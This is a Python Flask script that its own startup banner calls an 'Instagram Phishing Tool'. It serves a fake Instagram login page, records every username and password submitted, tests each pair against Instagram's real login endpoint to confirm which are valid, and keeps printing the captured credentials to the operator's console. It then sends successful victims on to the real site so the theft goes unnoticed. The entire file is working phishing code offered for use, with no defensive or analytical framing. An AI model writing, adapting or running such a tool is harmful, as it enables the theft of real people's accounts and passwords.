python
from flask import Flask, request, redirect, render_template, Response
import requests
import threading
import time
import os
import signal
import sys
from urllib.parse import unquote

app = Flask(__name__)

# Global variables to store credentials
credentials = []
lock = threading.Lock()

@app.route('/')
def index():
    return render_template('login.html')

@app.route('/login', methods=['POST'])
def login():
    username = request.form['username']
    password = request.form['password']
    
    # Store credentials
    with lock:
        credentials.append({'username': username, 'password': password, 'timestamp': time.time()})
    
    # Check if credentials are valid
    is_valid = check_credentials(username, password)
    
    if is_valid:
        print(f"\033[92m[+] SUCCESS: Valid credentials!\033[0m")
        print(f"\033[92m[+] Username: {username}\033[0m")
        print(f"\033[92m[+] Password: {password}\033[0m")
        # Redirect to real Instagram
        return redirect('https://www.instagram.com/')
    else:
        print(f"\033[91m[-] FAILED: Invalid credentials\033[0m")
        print(f"\033[91m[-] Username: {username}\033[0m")
        print(f"\033[91m[-] Password: {password}\033[0m")
        # Show error on fake page
        return render_template('login.html', error=True)

def check_credentials(username, password):
    try:
        # Create session for Instagram
        session = requests.Session()
        
        # Get initial page for cookies
        session.get('https://www.instagram.com/')
        
        # Prepare login data
        login_data = {
            'username': username,
            'enc_password': f'#PWD_INSTAGRAM_BROWSER:0:0:{password}',
            'queryParams': '{}',
            'optIntoOneTap': 'false'
        }
        
        # Headers to mimic real browser
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
            'X-Instagram-AJAX': '1',
            'X-CSRFToken': session.cookies.get_dict().get('csrftoken', ''),
            'X-Requested-With': 'XMLHttpRequest',
            'Referer': 'https://www.instagram.com/'
        }
        
        # Try to login
        response = session.post(
            'https://www.instagram.com/accounts/login/ajax/',
            data=login_data,
            headers=headers
        )
        
        # Check if login successful
        if response.json().get('authenticated'):
            return True
        else:
            return False
    except Exception as e:
        print(f"Error checking credentials: {e}")
        return False

def display_credentials():
    while True:
        with lock:
            if credentials:
                print("\n\033[93m--- Captured Credentials ---\033[0m")
                for cred in credentials[-5:]:  # Show last 5 credentials
                    print(f"\033[93mUsername: {cred['username']}\033[0m")
                    print(f"\033[93mPassword: {cred['password']}\033[0m")
                    print(f"\033[93mTimestamp: {time.ctime(cred['timestamp'])}\033[0m")
                    print("\033[93m---------------------------\033[0m")
        time.sleep(5)

def signal_handler(sig, frame):
    print('\n\033[91mShutting down...\033[0m')
    sys.exit(0)

if __name__ == '__main__':
    # Start the credentials display thread
    cred_thread = threading.Thread(target=display_credentials)
    cred_thread.daemon = True
    cred_thread.start()
    
    # Register signal handler for Ctrl+C
    signal.signal(signal.SIGINT, signal_handler)
    
    print("\033[92mInstagram Phishing Tool Started\033[0m")
    print("\033[92mAccess the tool at: http://localhost:8080\033[0m")
    print("\033[92mPress Ctrl+C to stop\033[0m")
    
    app.run(host='0.0.0.0', port=8080, debug=False)
